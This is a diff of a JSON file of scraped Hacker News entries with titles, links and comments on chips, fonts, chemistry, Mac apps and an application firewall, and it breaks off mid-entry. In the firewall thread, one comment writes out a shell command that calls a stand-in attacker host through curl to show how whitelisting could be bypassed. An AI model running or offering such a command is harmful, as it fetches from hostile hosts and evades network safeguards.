@@ -1,374 +1,334 @@
 [
   {
-    "title": "DARPA wants to bypass the thermal middleman in nuclear power systems (ans.org)",
-    "points": 103,
-    "submitter": "bilsbie",
-    "submit_time": "2024-08-09T21:12:34",
-    "num_comments": 63,
-    "comments_url": "https://news.ycombinator.com/item?id=41205439",
+    "title": "AMD's Strix Point: Zen 5 Hits Mobile (chipsandcheese.com)",
+    "points": 82,
+    "submitter": "klelatti",
+    "submit_time": "2024-08-10T21:18:51",
+    "num_comments": 29,
+    "comments_url": "https://news.ycombinator.com/item?id=41212271",
     "comments": [
-      "Nuclear batteries with beta emitters driving some kind of semiconductor have been around for a while, but they're very low power.[1]\"... Betavolt's team of scientists developed a unique single-crystal diamond semiconductor that is only 10 microns thick, placing a 2-micron-thick nickel-63 sheet between two diamond semiconductor converters to convert the decay energy of the radioactive source into electric current to form an independent unit.\"\"... 100 microwatts, a voltage of 3V, and a volume of 15 X 15 X 5 cubic millimeters ...\"3-4 orders below the power requirements for a phone. An AirTag-type intermittent device, though...So, can those be scaled up? Are all those little beta-emitters in coin cell form factor going to be a problem?  Nickel-63 has a half life of 100 years, so they'll be active for a while. Not dangerous unless broken up and ingested, but need to be kept out of the food chain.[1] https://www-betavolt-tech.translate.goog/359485-359485_64506...\n \nreply",
-      "Not dangerous unless broken up and\n    ingested, but need to be kept out\n    of the food chain.\n\nNo worse than a NiCad in that respect. Probably better, if anything, since it's so much easier to detect and track.\n \nreply",
-      "Without going into too many specifics, for a period during my career I was involved with an organization whose responsibility it is to track nuclear materials and keep them under safe surveillance\u2014in fact my job had the words 'surveillance engineer' in its title.I say that only bring to your attention how difficult this would be in practice. Putting safety aside for a moment, in most countries the regulatory restrictions are enormous because they are signatories to the NPT\u2014Treaty on the Non-Proliferation of Nuclear Weapons which tightly bind them to how they use and handle  nuclear materials. This involves, use, tracking, short and long-term disposal thereof not to mention how to keep radioactive materials away from bad actors/those who've ill intent.With safety, there are so many issues involved that I can hardly even mention them here. Just as an illustration, the once lack of regulations covering the manufacture and use of luminous radium paint turned out to be a disaster.I've thought about this a great deal, whenever the batteries in my flashlight die I wish I had some nuclear powered ones and evey time I'm brought back to reality when I think how difficult it would be to implement in practice.\n \nreply",
-      "I meant precisely what I said. Tracking NiCads to the standards of the NPT would presumably be impossible. If your standard is \"keep it out of the food supply\", though, I guarantee that there's a little bit of NiCad in that hot dog in your fridge, and there'd be much less NiCad in your hot dog if they tripped a radiation detector before they hit the incinerator or the landfill.\n \nreply",
-      "I've always said that I'm more afraid of heavy metal contamination then nuclear material contamination.There are no hand held devices which will tell you if the soil you're vaguely near has heavy metals in it, nor how much.\n \nreply",
-      "There are no hand held devices which will tell you if the soil you're vaguely near has heavy metals in it, nor how much.Well, technically, there are, but now you're back in the ionizing-radiation business: https://www.youtube.com/watch?v=KdfHVcU8U7U\n \nreply",
-      "And set off all the NBC detectors on the highways near major cities.\n \nreply",
-      "Well yes but only if destroyed. Then wouldn\u2019t you call that a feature? When in their enclosures there should be no radiation.\n \nreply",
-      "No way could all the alerts be tracked.\n \nreply",
-      "Yeah, you bring up another angle to look at it from: even if the alerts didn't go off when the batteries are being used/stored properly, it would make it easy to create a lot of noise/false positives as part of an actual attack (were those batteries to be readily available).\n \nreply"
+      "IMO, the most interesting thing about this line is the battery life---within an hour of MBP3 and within 2 hours of Asus's Qualcomm. Making it comparable to ARM architectures.Which is a little surprising because ARM is commonly believed to be much more power efficient than x86.[1] https://youtu.be/Z8WKR0VHfJw?si=A7zbFY2lsDa8iVQN&t=277\n \nreply",
+      "ARM got a lot of hype since the release of the M1, but most users only compared it to the terrible Intel MBPs. Ryzen mobile has been consistently close to Apple silicon perf/watt for 5 years. But got little press coverage.Hype can be really decorrelated from real world performance.\n \nreply",
+      "Any efficiency comparison involving Apples chips also has to factor in that Tim Cook keeps showing up at TSMCs door with a freight container full of cash to buy out exclusive access to their bleeding edge silicon processes. ARM may be a factor but don't underestimate the power of having more money than God.Case in point, Strix Point is built on TSMC 4nm while Apple is already using TSMCs second generation 3nm process.\n \nreply",
+      "Process helps but have you seen benchmarks showing equivalent performance between the same process node? I think it\u2019s less that ARM is amazing than the Apple Silicon team being very good and paired with aggressive optimization throughout the stack but everything I\u2019ve seen suggests they are simply building better chips at their target levels (not server, high power, etc.).\n \nreply",
+      "But how is this the case? I never saw a single article mentioning that a non-Mac laptop was better.(Random article saying M3 pro is better than a Dell laptop https://www.tomsguide.com/news/macbook-pro-m3-and-m3-max-bat... )\n \nreply",
+      "I have heard that part of the reason for little coverage of ryzen mobile CPUs is  their limited availability as AMD was focussing on using the fab capacity for server chips.\n \nreply",
+      "Ryzen mobile is consistently close, yeah. But with the sole exception of the Steam deck, I've yet to see a Ryzen mobile-bearing laptop, Windows included, which is close to the overall performance of the Macbook.\n \nreply",
+      "> But with the sole exception of the Steam deckUuh wut? The Steam Deck is like 3-generation-old hardware in mobile Ryzen terms. In a lot of ways it's similar to a pared-back 4800u with fewer (and older) cores, and a slightly bumped up GPU.To me it's kinda the opposite. Excluding the Steam Deck, I think most of AMD's Ultrabook APUs have been very close to the products Apple's made on the equivalent nodes. Even on 7nm the 4800u put up a competitive fight against M1, and the gap has gotten thinner with each passing year. According to the OpenCL benchmarks, the Radeon 680m on 6nm scores higher than the M1 on 5nm: https://browser.geekbench.com/opencl-benchmarksEven back when Ryzen Mobile only shipped with Vega, it was pretty clear that Apple and AMD were a pretty close match in onboard GPU power.\n \nreply",
+      "Steam Deck might be behind in terms of hardware but in terms of software it's way beyond your typical x86 linux system power efficiency, and dare I say it's doing better than windows. All that contributes to make it punch well above it's weight.\n \nreply",
+      "Battery tests are important, but so is how it fairs on battery (what is the performance drop off to maintain that), what\u2019s its performance is ant its peak and how it long before it throttles when pushed.The M series processors have succeeded in all four: battery life, performance parity between battery and plugged in, high performance and performance sustainability.So far, very few benchmarks have been comparing the latter three as part of the full package assessment.\n \nreply"
     ],
-    "link": "https://www.ans.org/news/article-6276/darpa-wants-to-bypass-the-thermal-middleman-in-nuclear-power-systems/",
-    "first_paragraph": "A message from Curtiss-WrightA Clean Energy Powerhouse: The Digital I&C Systems Modernizing NuclearLearn MoreNuclear power already has an energy density advantage over other sources of thermal electricity generation. But what if nuclear generation didn\u2019t require a steam turbine? What if the radiation from a reactor was less a problem to be managed and more a source of energy? And what if an energy conversion technology could scale to fit nuclear power systems ranging from miniature batteries to the grid? The Defense Advanced Research Projects Agency (DARPA) Defense Sciences Office (DSO) is asking these types of questions in a request for information on High Power Direct Energy Conversion from Nuclear Power Systems, released August 1.DARPA is interested in ideas to take alpha, beta, gamma, and neutron radiation from \u201cany type of reactor,\u201d including fission and fusion, and from nuclear processes and radioisotope decay, and directly convert those radioactive emissions to electricity to me"
-  },
-  {
-    "title": "Urchin Software Corp: The unlikely origin story of Google Analytics, 1996\u20132005 (2016) (urchin.biz)",
-    "points": 78,
-    "submitter": "cpeterso",
-    "submit_time": "2024-08-09T20:32:11",
-    "num_comments": 21,
-    "comments_url": "https://news.ycombinator.com/item?id=41205176",
-    "comments": [
-      "> The UTM, or Urchin Traffic Monitor, was an early method for augmenting Apache (or IIS, etc.) log files with cookies, such that unique visitors could be established.Of course, \u201cutm\u201d lives on today as a standard prefix for link tracking parameters, even outside of google analytics\n \nreply",
-      "I'm very surprised that they signed up whole ISPs and got away with it.I wasn't able to process the daily logs of the tracking pixel of the site I was operating on Urchin 5 within 24 hours. I had a beefy server with a 16 drive raid array but the log processing never used multiple cores.By that time Google had aquired them, support didn't exist because they wanted you to switch to Google Analytics and it was basically 30k down the drain.\n \nreply",
-      "I can't really explain how cool Urchin was. I think it was one of the first truly analytical software I used \u2014 not just from a web traffic point of view, but it was a site that used and presented data. The graphs, the maps, even the two-column UI was stuff a lot of web developers copied and riffed on back then. It really opened my mind up to a lot of things: design, software as a service (and installable software), even acquisitions in general. Strangely had a large impact on my future career.\n \nreply",
-      "That picture of their first computer, a sparcstation, brought back memories.Our first computer at Cygnus was a sparcstation that was actually a \u201cprototype\u201d (probably PVT since it had all the housing etc) for the first sparcstation.  I think Andy B had given it to John.  It worked fine and lasted for years.When the author said they\u2019d started the company on a 10K investment I knew they were my kind of people.\n \nreply",
-      "I loved this retell. Brings back the old days, especially the Google and Yahoo parties of the late 2000's. Those were crazy. They literally carried one of my employees out of a basement rave who had passed out from drinking too much.\n \nreply",
-      "> Our first tradeshow ever, circa 1997.Pardon my one nitpick: the computer in the photo (PowerMac1,1) was introduced 1999-01-05.\n \nreply",
-      "What about defunct startup shirts? Like, I\u2019d wear that Urchin shirt.\n \nreply",
-      "That sounds like a potential business idea even. Although realistically I guess eBay and Craigslist already has that covered :p\n \nreply",
-      "(2016)(In case anyone else is surprised by the line in the article that the \u201c10th anniversary of the acquisition has recently passed.\u201d)\n \nreply",
-      "Worked at a hosting company in those years.. urchin was the GOAT. we ran it for every customer, and relied on it heavily for billing our customers. It was crazy fast and elegant. Nothing came close\n \nreply"
-    ],
-    "link": "https://urchin.biz/urchin-software-corp-89a1f5292999",
+    "link": "https://chipsandcheese.com/2024/08/10/amds-strix-point-zen-5-hits-mobile/",
     "first_paragraph": ""
   },
   {
-    "title": "Show HN: LLM-aided OCR \u2013 Correcting Tesseract OCR errors with LLMs (github.com/dicklesworthstone)",
-    "points": 290,
-    "submitter": "eigenvalue",
-    "submit_time": "2024-08-09T16:28:39",
-    "num_comments": 126,
-    "comments_url": "https://news.ycombinator.com/item?id=41203306",
-    "comments": [
-      "Fantastic work is emerging in this field, and with the new release of the schnell model of the flux series we will have the downstream captioning datasets we need to produce a new SOTA vision model, which has been the last straggler in the various open llm augmentations. Most vision models are still based on ancient CLIP/BLIP captioning and even with something like LLAVA or the remarkable phi-llava, we are still held back by the pretained vision components which have been needing love for some months now.Tessy and LLM is a good pipe, it's likely what produced SCHNELL and will soon be the reverse of this configuration, used for testing and checking while the LLM does the bulk of transcription via vision modality adaption. The fun part of that is that multi lingual models will be able to read and translate, opening up new work for scholars searching through digitized works. Already I have had success in this area with no development at all, after we get our next SOTA vision models I am expecting a massive jump in quality. I expect english vision model adapters to show up using LLAVA architecture first, this may put some other latin script languages into the readable category depending on the adapted model, but we could see a leapfrog of scripts becoming readable all at once. LLAVA-PHI3 already seems to be able to transcribe tiny pieces of hebrew with relative consistency. It also has horrible hallucinations, so there is very much an unknown limiting factor here currently. I was planning some segmentation experiments but schnell knocked that out of my hands like a bar of soap in a prison shower, I will be waiting for a distilled captioning sota to come before I re-evaluate this area.Exciting times!\n \nreply",
-      "Is LLaVA-Phi better than Phi Vision?edit: I think parent just doesn't know about Phi Vision, it appears to be a better model\n \nreply",
-      "In my experience, this works well but doesn't scale to all kinds of documents.\nFor scientific papers; it can't render formulas. meta's nougat is the best model to do that.\nFor invoices and records; donut works better.\nBoth these models will fail in some cases so you end up running LLM to fix the issues.\nEven with that LLM won't be able to do tables and charts justice, as the details were lost during OCR process (bold/italic/other nuances). I feel these might also be \"classical\" methods.\nI have found vision models to be much better as they have the original document/image. Having prompts which are clear helps but still you won't get 100% results as they tend to venture off on their paths.\nI believe that can be fixed using fine tuning but no good vision model provides fine tuning for images.\nGoogle Gemini seems to have the feature but I haven't tried it.\nFew shots prompting helps keep the LLM from hallucinating, prompt injection and helps adhering to the format requested.\n \nreply",
-      "Maybe a pipeline like:1. Segment document: Identify which part of the document is text, what is an image, what is a formula, what is a table, etc...2. For text, do OCR + LLM. You can use LLMs to calculate the expectation of the predicted text, and if it is super off, try using ViT or something to OCR.3. For tables, you can get a ViT/CNN to identify the cells to recover positional information, and then OCR + LLM for recovering the contents of cells4. For formulas (and formulas in tables), just use a ViT/CNN.5. For images, you can get a captioning ViT/CNN to caption the photo, if that's desired.\n \nreply",
-      "I don't see how you make LLM improve tables where most of the time table is single word or single value that doesn't have continuous context like a sentence.\n \nreply",
-      "IMHO, the LLM correction is most relevant/useful in the edge cases rather than the modal ones, so I totally agree.\n \nreply",
-      "I agree that vision models that actually have access to the image are a more sound approach than using OCR and trying to fix it up. It may be more expensive though, and depending on what you're trying to do it may be good enough.What I want to do is reading handwritten documents from the 18th century, and I feel like the multistep approach hits a hard ceiling there. Transkribus is multistep, but the line detecion model is just terrible. Things that should be easy, such as printed schemas, utterly confuse it. You simply need to be smart about context to a much higher degree than you need in OCR of typewriter-written text.\n \nreply",
-      "I also think it\u2019s probably more effective. Every time hand-crafted tools are better than AI but then the model becomes bigger and AI wins. Think hand crafted image classification to full model or hand crafted language translation to full model.In this case, the model can already do the OCR and becomes an order of magnitude cheaper per year.\n \nreply",
-      "We've been trying to solve this with https://vlm.run: the idea is to combine the character level accuracy of an OCR pipeline (like Tesseract) with the flexibility of a VLM. OCR pipelines struggle with non-trivial text layouts and don't have any notion of document structure, which means there needs to be another layer on top to actually extract text content to the right place. At the other end of the spectrum, VLMs (like GPT4o) tend to perform poorly on things like dense tables (either hallucinating or giving up entirely) and complex forms, in addition to being much slower/more expensive. Part of the fix is to allow a 'manager' VLM to dispatch to OCR on dense, simple documents, while running charts, graphs etc. through the more expensive VLM pipeline.\n \nreply",
-      "It's not OSS, but I've had good experiences with using MathPix's API for OCR for formulas\n \nreply"
-    ],
-    "link": "https://github.com/Dicklesworthstone/llm_aided_ocr",
-    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          \n        Enhance Tesseract OCR output for scanned PDFs by applying Large Language Model (LLM) corrections.\n      The LLM-Aided OCR Project is an advanced system designed to significantly enhance the quality of Optical Character Recognition (OCR) output. By leveraging cutting-edge natural language processing techniques and large language models (LLMs), this project transforms raw OCR text into highly accurate, well-formatted, and readable documents.To see what the LLM-Aided OCR Project can do, check out these example outputs:PDF to Image ConversionOCR ProcessingChunk CreationError Correction and FormattingDuplicate Content RemovalHeader and Page Number Suppression (Optional)Flexible LLM SupportLocal LLM HandlingAPI-based LLM HandlingAsynchronous ProcessingToken EstimationDynamic Token AdjustmentThe project uses a .env file for easy configurat"
-  },
-  {
-    "title": "Show HN: Attaching to a virtual GPU over TCP (thundercompute.com)",
-    "points": 155,
-    "submitter": "bmodel",
-    "submit_time": "2024-08-09T16:50:41",
-    "num_comments": 76,
-    "comments_url": "https://news.ycombinator.com/item?id=41203475",
-    "comments": [
-      "Ah this is quite interesting! I had a usecase where I needed a GPU-over-IP but only for transcoding videos. I had a not-so-powerful AMD GPU in my homelab server that somehow kept crashing the kernel any time I tried to encode videos with it and also an NVIDIA RTX 3080 in a gaming machine.So I wrote https://github.com/steelbrain/ffmpeg-over-ip and had the server running in the windows machine and the client in the media server (could be plex, emby, jellyfin etc) and it worked flawlessly.\n \nreply",
-      "Have you done a Show HN yet? If not, please consider doing so!https://gist.github.com/tzmartin/88abb7ef63e41e27c2ec9a5ce5d...https://news.ycombinator.com/showhn.htmlhttps://news.ycombinator.com/item?id=22336638\n \nreply",
-      "This is more or less what I was hoping for when I saw the submission title. Was disappointed to see that the submission wasn't actually a useful generic tool but instead a paid cloud service. Of course the real content is in the comments.As an aside, are there any uses for GPU-over-network other than video encoding? The increased latency seems like it would prohibit anything machine learning related or graphics intensive.\n \nreply",
-      "There is a GPU-over-network software called Juice [1]. I've used it on AWS for running CPU-intensive workloads that also happen to need some GPU without needing to use a huge GPU instance. I was able to use a small GPU instance, which had just 4 CPU cores, and stream its GPU to one with 128 CPU cores.I found Juice to work decently for graphical applications too (e.g., games, CAD software). Latency was about what you'd expect for video encode + decode + network: 5-20ms on a LAN if I recall correctly.[1] - https://github.com/Juice-Labs/Juice-Labs\n \nreply",
-      "Some computation tasks can tolerate the latency if they\u2019re written with enough overlap and can keep enough of the data resident, but they usually need more performant networking than this. See older efforts like rcuda for remote cuda over infiniband as an example. It\u2019s not ideal, but sometimes worth it. Usually the win is in taking a multi-GPU app and giving it 16 or 32 of them rather than a single remote GPU though.\n \nreply",
-      "Interesting. Do you know if your tool supports conversions resulting in multiple files, such as HLS and its myriad of timeslice files?\n \nreply",
-      "I'm confused, if this operates at the CPU/GPU boundary doesn't it create a massive I/O bottleneck for any dataset that doesn't fit into VRAM? I'm probably misunderstanding how it works but if it intercepts GPU i/o then it must stream your entire dataset on every epoch to a remote machine, which sounds wasteful, probably I'm not getting this right.\n \nreply",
-      "That understanding of the system is correct. To make it practical we've implemented a bunch of optimizations to minimize I/O cost. You can see how it performs on inference with BERT here: https://youtu.be/qsOBFQZtsFM?t=69.The overheads are larger for training compared to inference, and we are implementing more optimizations to approach native performance.\n \nreply",
-      "> to approach native performance.The same way one \"approaches the sun\" when they take the stairs?\n \nreply",
-      "Aah ok thanks, that was my basic misunderstanding, my mind just jumped straight to my current training needs but for inference it makes a lot of sense. Thanks for the clarification.\n \nreply"
-    ],
-    "link": "https://www.thundercompute.com/",
-    "first_paragraph": "Scale your usage up or down instantly, without limits, while only being billed for what you useSwitch GPUs instantly with a single command without leaving your instanceRun your existing code on Thunder Compute without changes or configSave money by developing on your CPU. When you want to scale, access a cluster of GPUs on-demand.Switch to the GPUs you need, when you need themNever worry about config, quotas, or reservations againWith Thunder Compute, never pay for idle GPUs. Give developers direct access to GPUs, with the freedom to scale quickly.GPUs at other cloud providers are utilized on-average 15% of the time, while 85% of what you pay goes to waste. With long-term reservations you have to guess how many GPUs you will need, resulting in shortages and overpayment.A cluster of high-performance GPUs at your fingertips without ever having to talk to ITShrink your cloud budget by eliminating idle GPU timeUse the Thunder Compute CLI to run your existing GPU code without any setupBehin"
-  },
-  {
-    "title": "Grace Hopper, Nvidia's Halfway APU (chipsandcheese.com)",
-    "points": 18,
-    "submitter": "PaulHoule",
-    "submit_time": "2024-08-09T22:52:13",
+    "title": "I Created 175 Fonts Using Rust (chevyray.dev)",
+    "points": 17,
+    "submitter": "azhenley",
+    "submit_time": "2024-08-10T23:52:44",
     "num_comments": 0,
     "comments_url": "",
     "comments": [
       "xxx"
     ],
-    "link": "https://chipsandcheese.com/2024/07/31/grace-hopper-nvidias-halfway-apu/",
+    "link": "https://chevyray.dev/blog/creating-175-fonts/",
     "first_paragraph": ""
   },
   {
-    "title": "GCVR (YC W22) Is Hiring Lead Animation Engineer (ycombinator.com)",
+    "title": "Things I Won't Work With: Dimethylcadmium (2013) (science.org)",
+    "points": 122,
+    "submitter": "Bluestein",
+    "submit_time": "2024-08-10T19:11:39",
+    "num_comments": 72,
+    "comments_url": "https://news.ycombinator.com/item?id=41211540",
+    "comments": [
+      "[I]ts odor is variously described as \"foul\", \"unpleasant\", \"metallic\", \"disagreeable\", and (wait for it) \"characteristic\", which is an adjective that shows up often in the literature with regard to smells, and almost always makes a person want to punch whoever thought it was useful.No need to punch them; if someone has been exposed to enough dimethylcadmium to describe its odor as \"characteristic\" they probably don't have long to live...\n \nreply",
+      "A generation ago or two ago, it was common for chemists to use taste and smell as a tools for qualitative evaluation of chemical compounds.So older scientific literature is full of all sorts of knowledge that was obtained in ways that are shockingly unsafe by modern standards, including gems like the taste of all sorts of poisons and how large quantities of plutonium are warm to the touch.\n \nreply",
+      "I'm sure the author knows this, and wants to punch them anyway.\n \nreply",
+      "A consumer report not too long ago found cadmium at unsafe levels in many dark chocolate brands: https://www.consumerreports.org/health/food-safety/lead-and-...The cacao was contaminated with cadmium from the soil during harvest.\n \nreply",
+      "In short the article and conclusions are a total mess and made a nice attention grabbing headline with little to no substance.As someone that has built and managed clinical laboratories for human samples, I find this article from consumer reports extremely misleading. The describe results as a percentage of a theoretically acceptable level. For example, for cadmium, they are saying an acceptable level is 4.1 ug/day . Then they seem to imply that \"TJ The Dark Chocolate Lover's Chocolate 85% Cacao\" has 229% of the 4.1ug/day if a consumer ate a 30g piece.They never actually spell out what they mean or what the actual results they found were, or what the limit of detection of the methodology was or the error range of their tests. I guess they are saying that that chocolate has 9.3ug of cadmium in a 30g sample but it's impossible to say from what they wrote.The FDA states that the maximum daily consumption of cadmium should be limited to 0.21-0.36ug per kg of body mass. For an avg american male that would mean a threshold of 17.64-30.24ug/day. A typical salad containing 250g of romaine lettuce has 2-14ug of cadmium in it. Lettuce and cereal grains are the most common sources of cadmium in american diets.The amounts we are talking about are extraordinarily small and difficult to measure. We are talking 5-100 quadrillion individual atoms of cadmium.https://article.images.consumerreports.org/image/upload/v167...\nhttps://www.fda.gov/food/environmental-contaminants-food/cad....\n \nreply",
+      ">The amounts we are talking about are extraordinarily small and difficult to measure. We are talking 5-100 quadrillion individual atoms of cadmium.In short you're saying that the CR numbers are suspicious because they're near the limits of what labs can detect? Is there some source you can provide for this?\n \nreply",
+      "> Lettuce and cereal grains are the most common sources of cadmium in american diets.Lettuce has cadmium. TIL.-> threshold of 17.64-30.24ug/day.So; it I am not mistaken; by these measurements the amount claimed to be contained in the article, for chocolate; would be within bounds ...(It's just you then could not go ahead and have a salad :)\n \nreply",
+      "Plants take up things in the soil. That tends to also extend to heavy metals and the like.It would be really hard to find totally pristine land for a range of crops. Some of the contamination is naturally occurring.\n \nreply",
+      "It would be interesting to mix micro-beads of silica aerogels for heavy metal absorbtion. [0]It would also be interesting if it would be a good inter-mix for fallow cycles soil amendment activities... With the addition to rockdust through the cycling of fields, one can instill nutrients, while removing any heavy metal buildup.The research as to whether silica aeogels can remove all sorts of things is interesting -- would be great to see about Glyphosate Removal. In lieu of the HN post about re-invigorating for the Monarch Butterfly [1] [2] [3][0] https://link.springer.com/article/10.1007/s13399-024-05469-6...[1] https://i.imgur.com/7avnKCP.png[2] https://www.sciencedirect.com/science/article/pii/S221334372...[3] https://news.ycombinator.com/item?id=41165273This is a fun rabbit hole:https://i.imgur.com/ObiAbCs.pnghttps://i.imgur.com/af9k3R0.pnghttps://i.imgur.com/Yq4HWTd.png\n \nreply",
+      "The half life of glyphosate in the soil is not that long (studies disagree, probably influenced by who funded it) but you wouldn\u2019t expect much, if any, in the soil after a year.Not sure it matters to monarchs if it\u2019s in the soil verses on plants.I would be worried about ingesting aerogels until it was proven safe, but it\u2019s an interesting idea.\n \nreply"
+    ],
+    "link": "https://www.science.org/content/blog-post/things-i-won-t-work-dimethylcadmium",
+    "first_paragraph": ""
+  },
+  {
+    "title": "Stapler: I remade a 32 year old classic Macintosh app (gingerbeardman.com)",
+    "points": 38,
+    "submitter": "msephton",
+    "submit_time": "2024-08-10T21:03:04",
+    "num_comments": 10,
+    "comments_url": "https://news.ycombinator.com/item?id=41212193",
+    "comments": [
+      "Nice! Similar to Brett Terpstra's Bunch[1] which has a GUI-less approach.[1]: https://bunchapp.co/\n \nreply",
+      "This is really cool \u2014 I\u2019ve wondered why something like this didn\u2019t exist for a long time and I\u2019m looking forward to checking it out.Thanks for filling in the gaps for all of us who don\u2019t just use one app at a time!\n \nreply",
+      "Any chance this could add launching windows to specific positions/sizes and/or, more importantly, to specific spaces?It still feels nuts to me that we have all this stuff and yet  when entering/exiting 'work mode' I have to either leave everything running indefinitely or reposition all my work apps every time I launch them.\n \nreply",
+      "You're not alone with this desire, and I still haven't found a good solution. I want to bookmark all apps and windows when working on something and recall them all later when I resume work. How is this not yet a thing when do much real work involves using so many different applications?.There is an app, Workspaces, I think, but it's not useful enough to bother using.Probably should be a macos feature one day\n \nreply",
+      "I would recommend using another tool to script those sorts of changes to the workspace, and then adding that to the Stapler Document.There is an app called Stay that remembers positions of Windows based on the app, title, etc. I used it for a  while, but not recently. https://cordlessdog.com/stay/\n \nreply",
+      "We might be looking for this:https://github.com/FancyWM/fancywm\n \nreply",
+      "My mind went to http://macintoshgarden.org/apps/simstapler\n \nreply",
+      "Tic-tac-toe desk accessory with the minimal DA support in system 10.4 .. running right now.. that binary is close to 40 years old if I am not mistaken.\n \nreply",
+      "This is cool.I've had a desire for something like this (windows/linux) -- what would be cool is if it knew the window size and layouts?So you could do a launch group that will do the whole desktops workspace - and can be saved (but also has a reset button to snap back to the layout if you mix things up. Support for a second desktop to launch then to - so you can throw one context cluster on each...)---Weren't you the one who lost all their archive content? What was the timeline with all of that?\n \nreply",
+      "If you quit and relaunch the app with windows open it will remember its documents positions and sizes. That function comes for free with a Document-Based App.If you want the Document to control the properies of the desktop, then I would write a little Automator app, shell script, Shortcut, etc. to do that and then add that to the Stapler Document. Use all available tools together.---Internet Archive: yes, that was me. Most of my account data is still gone. I don't think the deleted data will ever be restored. And so it goes. The blog post about that one has been updated with this info. Thanks for asking.\n \nreply"
+    ],
+    "link": "https://blog.gingerbeardman.com/2024/08/10/stapler-i-remade-a-32-year-old-classic-macintosh-app/",
+    "first_paragraph": "A couple of days ago I was reading on Hacker News about a feature in some Linux window managers where they allow collections of tabs from different apps.This reminded me of BeOS, but at the same time it reminded me of an app from 1992 for classic Macintosh called Stapler, and how I\u2019d talked about that and it\u2019s one-time spiritual successor LaunchList on Twitter in the past. These were both similar apps that allowed you to collect and launch all the apps, files, folders, documents, related to a specific task, thus saving time. Or as Ali\u00a0Rantakari so succinctly put it in 2009: \u201cOpening a Bunch of Stuff at Once on Your Mac\u201d.So over the past day or so I built my own take on this concept for modern macOS!Whilst my app is inspired by both Stapler (right down to the name) and LaunchList, my app adds improvements and features of its own and is more of a hybrid of both. For example, Stapler didn\u2019t have drag and drop and LaunchList didn\u2019t have zero-click auto-launch. My goal was to keep it as sim"
+  },
+  {
+    "title": "OpenSnitch is a GNU/Linux interactive application firewall (github.com/evilsocket)",
+    "points": 251,
+    "submitter": "dp-hackernews",
+    "submit_time": "2024-08-10T14:15:52",
+    "num_comments": 55,
+    "comments_url": "https://news.ycombinator.com/item?id=41209688",
+    "comments": [
+      "I've tried to use it extensively (as an interactive firewall). However there are just some problems (that are not the fault of OpenSnitch) that I'm not even sure that are even solvable.For example, supposed I run `curl` on the terminal, I can either always decide on a case-by-case basis to allow it thru, or I'm required to whitelist it permanently.\nOnce I've whitelisted generic tools like `curl` or `wget`, then the floodgates are really open, since any malware that have compromised my machine can just use `curl` or `wget` to get to the internet without hitting the firewall.\n \nreply",
+      "I\u2019ve found that by using subdomain wildcards and/or subnets, I build up a stable set of rules pretty quickly and then only have to review  requests to new endpoints once in awhile.To me, the peace of mind knowing that I\u2019ll be prompted to allow new access is worth the initial hassle. And once the habit is built, it\u2019s pretty easy to manage.Editing to add: I also use expiring rules regularly. Maybe I trust an installer and want to let it do its thing. So I open it up with a rule for the executable expiring in the near future (options include: forever, until reboot, for the next 30s, for the next 5 mins, etc). This can drastically simplify some tasks if there are a large number of endpoints for some reason and avoids leaving a hole open permanently.\n \nreply",
+      "IMO - requires a ton of work. Adoption requires updating rules quite often\n \nreply",
+      "Sounds like that varies widely by person/use case. I\u2019ve been using this software for a couple years at this point. I don\u2019t have to update rules all that often (usually a few rules/week), and when I do, it\u2019s usually a 10-30 second detour. The only time it takes more work is if I don\u2019t know why something is trying to connect. But that\u2019s exactly the scenario I\u2019m targeting, i.e. calling attention to the weird looking connections.My use cases are general productivity, development on side projects and a variety of software experiments, gaming, and some local AI stuff.I also don\u2019t see this as a ton of work. Rules are 99% pre-configured for you and all you have to do is choose the scope and duration of the rule and whether to reject or allow.I\u2019ll admit it\u2019s annoying once in awhile if there\u2019s a major update to software that spawns a bunch of new rules, but once I get past the feeling of being annoyed, it\u2019s really an extremely simple and quick process.Really have to emphasize the habit creation part. After I stuck with it for a few weeks, it became second nature and I stopped getting annoyed for the most part. I consider this a worthwhile habit to build if you\u2019re trying lots of code/libraries and want to know what\u2019s phoning where.\n \nreply",
+      "A few rules per week sounds like a lot. I think I am not paranoid enough to micromanage my connections like this.\n \nreply",
+      "In terms of time spent, that amounts to about one minute per week for me right now. Sometimes less.The user experience is streamlined, and adding rules involves responding to a dialog that automatically pops up when a connection is attempted. UX is key here and this would be a very different story if you had to go into a separate rule management interface every time.Regarding paranoia, I don\u2019t see it that way. Supply chain attacks are alive and well, and if you\u2019re running other people\u2019s code on a regular basis, this is a low cost precautionary measure. I totally recognize that not everyone has the same risk profile or tolerance.\n \nreply",
+      "a sudo like wrapper for this could be pretty cool.still will capture when processes unexpectedly try to connect to the network for the first time and there is some value in that. even if the popups aren't great.\n \nreply",
+      "Might be the same but what if you allow all curl/wget traffic for 'dev' user, but continue to flag any traffic for 'normal' userfor dev work run 'su -c curl \u2026 dev'But if malicious program in normal user space is running, then app firewall flags curl and wget use appropriately.It would be annoying to input password every time so maybe setup PAM to use yubikey or biometric? Also make sure this user cannot login and does not have a password.\n \nreply",
+      "I wonder if there's a way to configure it so that when the parent cmd is a trusted command (say, a bash/zsh owned by the user), it could let the curl command through and otherwise block it. But yeah, that seems like a bit of a hassle.\n \nreply",
+      "Then any process can do `system(\u201cbash -c curl malware.attacker\u201d)`\n \nreply"
+    ],
+    "link": "https://github.com/evilsocket/opensnitch",
+    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          \n        OpenSnitch is a GNU/Linux interactive application firewall inspired by Little Snitch.\n      \n  Join the project community on our server!\n  \n\n\n\n\n\n\n\n\n\n\n\nOpenSnitch is a GNU/Linux application firewall.\u2022\u2022 Key Features \u2022 Download \u2022 Installation \u2022 Usage examples \u2022 In the press \u2022\u2022\n\nDownload deb/rpm packages for your system from https://github.com/evilsocket/opensnitch/releases$ sudo apt install ./opensnitch*.deb ./python3-opensnitch-ui*.deb$ sudo yum localinstall opensnitch-1*.rpm; sudo yum localinstall opensnitch-ui*.rpmThen run: $ opensnitch-ui or launch the GUI from the Applications menu.Please, refer to the documentation for detailed information.Examples of OpenSnitch intercepting unexpected connections:https://github.com/evilsocket/opensnitch/discussions/categories/show-and-tellHave you seen a connection you didn't expect? submit it!I"
+  },
+  {
+    "title": "Our Founder \u2013 Momofuku Ando (nissin.com)",
+    "points": 60,
+    "submitter": "rawgabbit",
+    "submit_time": "2024-08-09T16:24:28",
+    "num_comments": 11,
+    "comments_url": "https://news.ycombinator.com/item?id=41203269",
+    "comments": [
